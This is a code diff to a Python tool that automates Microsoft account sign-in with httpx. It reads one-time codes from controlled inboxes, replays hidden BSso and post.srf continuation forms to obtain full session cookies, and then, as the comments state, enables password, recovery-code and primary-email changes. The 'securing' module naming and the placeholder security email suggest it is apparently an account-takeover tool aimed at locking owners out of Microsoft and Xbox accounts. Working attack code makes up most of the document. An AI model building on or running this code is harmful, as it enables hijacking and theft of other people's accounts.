@@ -58,9 +58,217 @@ def _is_msal_bridge(html: str) -> bool:
     )
 
 
+# ---------------------------------------------------------------------------
+# Login continuation forms
+#
+# Microsoft finishes a classic (non-MSAL) login with a hidden-input form the
+# browser posts on the user's behalf:
+#
+#   * BSso      -> ppsecure/bsso.srf  (pprid / NAP / ANON / t)
+#   * post.srf  -> ppsecure/post.srf  (login / resp / PPFT / wreply / t)
+#
+# That post is what turns an accepted OTP into a real signed-in session
+# (WLSSC). httpx never did it, so the session stayed half-signed-in:
+# account.live.com kept answering with the sign-in page (i5030) and every
+# password / recovery-code / primary-email change was refused.
+#
+# The sign-in page itself also carries a form, so a marker is required --
+# posting that one would just re-render the sign-in page.
+# ---------------------------------------------------------------------------
+
+
+def _hidden_inputs(html: str) -> dict[str, str]:
+    """Every ``<input name=... value=...>`` in ``html``."""
+    out: dict[str, str] = {}
+    for tag in re.findall(r"<input\b[^>]*>", html or "", re.I):
+        name_m = re.search(r'\bname="([^"]+)"', tag, re.I)
+        if not name_m:
+            continue
+        value_m = re.search(r'\bvalue="([^"]*)"', tag, re.I)
+        out[name_m.group(1)] = value_m.group(1) if value_m else ""
+    return out
+
+
+def _login_form(html: str) -> tuple[str, dict[str, str]] | None:
+    """The login-continuation form on ``html`` as ``(action, fields)``.
+
+    Returns ``None`` when the page carries no such form (e.g. the plain
+    sign-in page, or the JavaScript-only MSAL bridge).
+    """
+    text = html or ""
+    blocks = re.findall(r"<form\b[^>]*>.*?</form>", text, re.I | re.S)
+    if not blocks:
+        blocks = [text]
+    for block in blocks:
+        action_m = re.search(r'\baction="([^"]*)"', block, re.I)
+        if not action_m:
+            continue
+        action = action_m.group(1).replace("&amp;", "&").strip()
+        if not action:
+            continue
+        if action.startswith("/"):
+            action = "https://login.live.com" + action
+        fields = _hidden_inputs(block)
+        if not fields:
+            continue
+        keys = {k.lower() for k in fields}
+        if "pprid" in keys and fields.get("pprid"):
+            return action, fields
+        if "resp" in keys and fields.get("resp"):
+            return action, fields
+        if {"nap", "anon"} <= keys and fields.get("NAP") and fields.get("ANON"):
+            return action, fields
+        if (
+            {"login", "wreply", "ppft"} <= keys
+            and fields.get("wreply")
+            and fields.get("t")
+        ):
+            return action, fields
+    return None
+
+
+async def _submit_login_form(
+    session: httpx.AsyncClient,
+    html: str,
+) -> httpx.Response | None:
+    """Post the login-continuation form on ``html`` (all of its hidden fields)."""
+    form = _login_form(html)
+    if not form:
+        return None
+    action, fields = form
+    try:
+        resp = await session.post(
+            url=action,
+            headers={
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Referer": "https://login.live.com/",
+            },
+            data=fields,
+            follow_redirects=True,
+            timeout=_POLISH_TIMEOUT,
+        )
+    except (httpx.TimeoutException, httpx.TransportError) as exc:
+        logging.warning("polish_host: continuation form post failed (%s)", exc)
+        return None
+    logging.info(
+        "polish_host: continuation form posted -> status=%s url=%s wlssc=%s amc=%s",
+        resp.status_code,
+        str(resp.url)[:160],
+        has_cookie(session, "WLSSC"),
+        has_cookie(session, "AMCSecAuth"),
+    )
+    return resp
+
+
+async def _follow_login_forms(
+    session: httpx.AsyncClient,
+    response: httpx.Response,
+    *,
+    max_forms: int = 3,
+) -> httpx.Response:
+    """Submit the continuation forms a browser would submit, in order.
+
+    Stops as soon as WLSSC shows up or the page stops carrying a form.
+    """
+    seen: set[tuple[str, str]] = set()
+    current = response
+    for _ in range(max_forms):
+        form = _login_form(current.text or "")
+        if not form:
+            break
+        action, fields = form
+        marker = (
+            action,
+            fields.get("resp") or fields.get("pprid") or fields.get("t") or "",
+        )
+        if marker in seen:
+            break
+        seen.add(marker)
+        resp = await _submit_login_form(session, current.text or "")
+        if resp is None:
+            break
+        current = resp
+        print(
+            "[+] - Polish: submitted login continuation form "
+            f"(status={current.status_code}, "
+            f"WLSSC={'yes' if has_cookie(session, 'WLSSC') else 'no'})",
+            flush=True,
+        )
+        if has_cookie(session, "WLSSC"):
+            break
+    return current
+
+
+async def _bsso_handshake(
+    session: httpx.AsyncClient,
+    portal: str = "https://account.live.com/",
+) -> bool:
+    """Finish the account.live.com handshake so WLSSC is issued.
+
+    account.live.com answers a signed-in login.live.com request with the BSso
+    interrupt form (pprid / NAP / ANON / t). A browser posts it to
+    ppsecure/bsso.srf, and *that* response is what sets WLSSC -- the cookie
+    every later security change needs. httpx never posted it, so the session
+    stayed half-signed-in and account.live.com kept answering with the
+    sign-in page.
+    """
+    try:
+        resp = await session.get(
+            portal,
+            follow_redirects=True,
+            timeout=_POLISH_TIMEOUT,
+        )
+    except (httpx.TimeoutException, httpx.TransportError) as exc:
+        logging.warning("bsso handshake: GET %s failed (%s)", portal, exc)
+        return False
+
+    form = _login_form(resp.text or "")
+    if not form:
+        logging.info(
+            "bsso handshake: no BSso form at %s (status=%s len=%s)",
+            portal,
+            resp.status_code,
+            len(resp.text or ""),
+        )
+        return False
+
+    action, fields = form
+    try:
+        out = await session.post(
+            url=action,
+            headers={
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Referer": portal,
+            },
+            data=fields,
+            follow_redirects=True,
+            timeout=_POLISH_TIMEOUT,
+        )
+    except (httpx.TimeoutException, httpx.TransportError) as exc:
+        logging.warning("bsso handshake: POST %s failed (%s)", action[:120], exc)
+        return False
+
+    ok = has_cookie(session, "WLSSC")
+    logging.info(
+        "bsso handshake %s -> status=%s url=%s wlssc=%s",
+        portal,
+        out.status_code,
+        str(out.url)[:160],
+        ok,
+    )
+    if ok:
+        print("[+] - Polish: account.live.com handshake issued WLSSC", flush=True)
+    return ok
+
+
 # Cookies only issued once the login actually finished. ``__Host-MSAAUTH`` is
 # set as soon as the OTP is accepted, so it is NOT a "signed in" signal.
 _SESSION_COOKIES = ("WLSSC", "MSPAuth", "AMCSecAuth", "AMCSecAuthJWT")
+
+# The cookies account.live.com actually needs for a security change: WLSSC is
+# the login.live.com session, AMCSecAuth(JWT) is the account-portal one.
+# ``MSPAuth`` is set early in the flow and does NOT mean the login finished.
+_SECURITY_SESSION_COOKIES = ("WLSSC", "AMCSecAuth", "AMCSecAuthJWT")
 
 
 def login_session_ready(session: httpx.AsyncClient) -> bool:
@@ -71,6 +279,16 @@ def login_session_ready(session: httpx.AsyncClient) -> bool:
     sign-in is denied and Xbox sisu SSO bounces to a login page.
     """
     return any(has_cookie(session, name) for name in _SESSION_COOKIES)
+
+
+def security_session_ready(session: httpx.AsyncClient) -> bool:
+    """True when the session can actually change account.live.com settings.
+
+    Unlike :func:`login_session_ready` this ignores ``MSPAuth``, which is set
+    before the login finished. A session with only ``MSPAuth`` still gets the
+    i5030 sign-in page back and every security change is refused.
+    """
+    return any(has_cookie(session, name) for name in _SECURITY_SESSION_COOKIES)
 
 
 async def _post_kmsi(session: httpx.AsyncClient, url_post: str, ppft: str):
@@ -89,6 +307,24 @@ async def _post_kmsi(session: httpx.AsyncClient, url_post: str, ppft: str):
         follow_redirects=True,
         timeout=_POLISH_TIMEOUT,
     )
+
+
+async def _ensure_wlscc(session: httpx.AsyncClient) -> bool:
+    """Make sure the account.live.com session (WLSSC) exists.
+
+    The BSso handshake is the only thing that issues WLSSC, so it is worth
+    repeating while the session is still missing it. A failed handshake is
+    usually a stale cookie jar rather than a dead account.
+    """
+    if has_cookie(session, "WLSSC"):
+        return True
+    for portal in (
+        "https://account.live.com/",
+        "https://account.live.com/proofs/Manage/additional",
+    ):
+        if await _bsso_handshake(session, portal):
+            return True
+    return False
 
 
 async def _retry_kmsi_with_fresh_tokens(session: httpx.AsyncClient) -> str | None:
@@ -121,10 +357,17 @@ async def _retry_kmsi_with_fresh_tokens(session: httpx.AsyncClient) -> str | Non
             attempt,
             (resp.text or "")[:2000],
         )
+        # A fresh reply can carry the continuation form instead of an SSO URL.
+        resp = await _follow_login_forms(session, resp)
         sso = _extract_sso_redirect(resp.text or "")
         if sso:
             print(f"[+] - Polish: login finished with fresh tokens (attempt {attempt})")
             return sso
+        if has_cookie(session, "WLSSC"):
+            print(
+                f"[+] - Polish: login finished with fresh tokens (attempt {attempt})"
+            )
+            return None
     return None
 
 
@@ -137,8 +380,12 @@ async def ensure_login_session(
 ) -> bool:
     """Re-run the OTP login to finish a half-established login.live.com session.
 
-    Only possible when the account's OTP proof mailbox is one we can read; if
-    it is not, this returns False and callers keep their existing behaviour.
+    The OTP destination is Microsoft's choice, not ours: ``send_auth`` reports
+    which proof the code is going to (``otc_inbox``) and steers to a proof we
+    can read whenever there is one. The caller-supplied ``security_email`` is
+    only a hint -- this runs before any security email is known, so the value
+    is still the "Couldn't Change!" placeholder. Gating on it made the whole
+    recovery path unreachable, which is why a dead session was never repaired.
     """
     from mail.settings import is_our_inbox
     from securing.auth.get_msaauth import get_msaauth
@@ -146,14 +393,11 @@ async def ensure_login_session(
     from securing.utils.cookies.get_email_code import get_email_code
     from securing.utils.cookies.get_livedata import livedata
 
-    address = str(security_email or "").strip()
-    if not email or not address or not is_our_inbox(address):
-        logging.warning(
-            "login session recovery skipped — unreadable OTP inbox for %s (security_email=%r)",
-            email,
-            security_email,
-        )
+    if not email:
+        logging.warning("login session recovery skipped — no account email")
         return False
+
+    hint = str(security_email or "").strip()
 
     for attempt in (1, 2):
         since = time.time()
@@ -167,15 +411,38 @@ async def ensure_login_session(
         except Exception:
             logging.exception("login session recovery: send_auth failed")
             return False
-        flowtoken = info.get("gotc_flowtoken") if isinstance(info, dict) else None
+        if not isinstance(info, dict):
+            logging.warning(
+                "login session recovery: unexpected send_auth payload for %s", email
+            )
+            return False
+        flowtoken = info.get("gotc_flowtoken")
         if not flowtoken:
             logging.warning(
                 "login session recovery: no OTP flow token for %s (resp=%r)",
                 email,
-                (info or {}).get("type") if isinstance(info, dict) else info,
+                info.get("type"),
             )
             return False
-        inbox = (info.get("otc_inbox") if isinstance(info, dict) else None) or address
+        if not info.get("otc_sent"):
+            logging.warning(
+                "login session recovery: Microsoft did not dispatch a code for %s "
+                "(destination=%r)",
+                email,
+                info.get("otc_destination"),
+            )
+            return False
+        inbox = info.get("otc_inbox")
+        if not inbox and is_our_inbox(hint):
+            inbox = hint
+        if not inbox or not is_our_inbox(inbox):
+            logging.warning(
+                "login session recovery skipped — OTP inbox for %s is not readable "
+                "(destination=%r)",
+                email,
+                info.get("otc_destination"),
+            )
+            return False
         print(
             f"[~] - Login session recovery {attempt}/2: waiting for code in {inbox}...",
             flush=True,
@@ -201,6 +468,13 @@ async def ensure_login_session(
             await polish_host(session, msaauth)
         except Exception:
             logging.exception("login session recovery: polish failed")
+        if not security_session_ready(session):
+            logging.warning(
+                "login session recovery attempt %s: login finished but the session "
+                "is still incomplete (no WLSSC/AMCSecAuth)",
+                attempt,
+            )
+            continue
         print(f"[+] - Login session recovery {attempt}/2: login re-established", flush=True)
         return True
     return False
@@ -232,6 +506,7 @@ async def polish_host(session: httpx.AsyncClient, post_data: dict) -> str:
                 )
             except (httpx.TimeoutException, httpx.TransportError) as exc:
                 logging.warning("polish_host cookies-only %s failed: %s", portal, exc)
+        await _ensure_wlscc(session)
         await ensure_amc_jwt(session)
         return ""
 
@@ -240,11 +515,21 @@ async def polish_host(session: httpx.AsyncClient, post_data: dict) -> str:
     logging.info("Polish Host Response: %s", polish.text[:2000])
     print(f"[+] - Polish Host Response: {polish.text[:500]}")
 
+    # A browser submits the form this page carries; that post is what turns an
+    # accepted OTP into a real signed-in session (WLSSC). Skip it and
+    # account.live.com keeps answering with the sign-in page, so every later
+    # password / recovery-code / primary-email change is refused.
+    polish = await _follow_login_forms(session, polish)
+
     if 'PageID" content="BssoInterrupt"' in polish.text or "BssoInterrupt" in polish.text:
-        logging.info("polish_host: BssoInterrupt — skipping SSO form finish")
+        logging.info("polish_host: BssoInterrupt — no continuation form on the page")
         print("[~] - Polish hit BssoInterrupt; relying on existing session cookies")
+        await _ensure_wlscc(session)
         await ensure_amc_jwt(session)
         return polish.text
+
+    # account.live.com hands out the BSso form that issues WLSSC.
+    await _ensure_wlscc(session)
 
     # JWT alone is enough for MSADELEGATE + owner-info fallback, but home APIs
     # (devices/family) need AMCSecAuth from the SSO form finish. Only skip the
@@ -268,6 +553,7 @@ async def polish_host(session: httpx.AsyncClient, post_data: dict) -> str:
     if not sso_redirect:
         logging.warning("polish_host: no complete-sso-with-redirect URL in response")
         print("[!] - Polish: no SSO redirect URL found — bootstrapping AMC JWT")
+        await _ensure_wlscc(session)
         await ensure_amc_jwt(session)
         return polish.text
 
@@ -289,31 +575,27 @@ async def polish_host(session: httpx.AsyncClient, post_data: dict) -> str:
     except (httpx.TimeoutException, httpx.TransportError) as exc:
         logging.warning("polish_host: SSO GET failed (%s) — continuing with cookies", exc)
         print(f"[!] - Polish SSO GET failed ({exc.__class__.__name__}); continuing")
+        await _ensure_wlscc(session)
         await ensure_amc_jwt(session)
         return polish.text
 
-    action_m = re.search(r'action="([^"]+)"', auth.text)
-    pprid_m = re.search(r'name="pprid"[^>]*value="([^"]+)"', auth.text)
-    nap_m = re.search(r'name="NAP"[^>]*value="([^"]+)"', auth.text)
-    anon_m = re.search(r'name="ANON"[^>]*value="([^"]+)"', auth.text)
-    t_m = re.search(r'name="t"[^>]*value="([^"]+)"', auth.text)
+    # The SSO page can carry the same continuation form.
+    auth = await _follow_login_forms(session, auth)
 
-    if not (action_m and pprid_m and nap_m and anon_m and t_m):
+    form = _login_form(auth.text or "")
+    if not form:
         logging.warning("polish_host: SSO page missing form fields")
         print("[!] - Polish: SSO page missing form fields — bootstrapping AMC JWT")
+        await _ensure_wlscc(session)
         await ensure_amc_jwt(session)
         return auth.text
 
+    action, fields = form
     try:
         await session.post(
-            url=action_m.group(1),
+            url=action,
             headers={"Content-Type": "application/x-www-form-urlencoded"},
-            data={
-                "pprid": pprid_m.group(1),
-                "NAP": nap_m.group(1),
-                "ANON": anon_m.group(1),
-                "t": t_m.group(1),
-            },
+            data=fields,
             follow_redirects=True,
             timeout=_POLISH_TIMEOUT,
         )
@@ -321,7 +603,19 @@ async def polish_host(session: httpx.AsyncClient, post_data: dict) -> str:
         logging.warning("polish_host: SSO form post failed (%s)", exc)
         print(f"[!] - Polish SSO form post failed ({exc.__class__.__name__})")
 
+    await _ensure_wlscc(session)
+
     if not _amc_api_ready(session):
         await ensure_amc_jwt(session)
+
+    if not security_session_ready(session):
+        logging.warning(
+            "polish_host: finished without a usable session (WLSSC/AMCSecAuth missing) "
+            "— account.live.com changes will be refused"
+        )
+        print(
+            "[!] - Polish finished without a usable Microsoft session "
+            "(no WLSSC/AMCSecAuth) — account.live.com changes will be refused"
+        )
 
     return auth.text
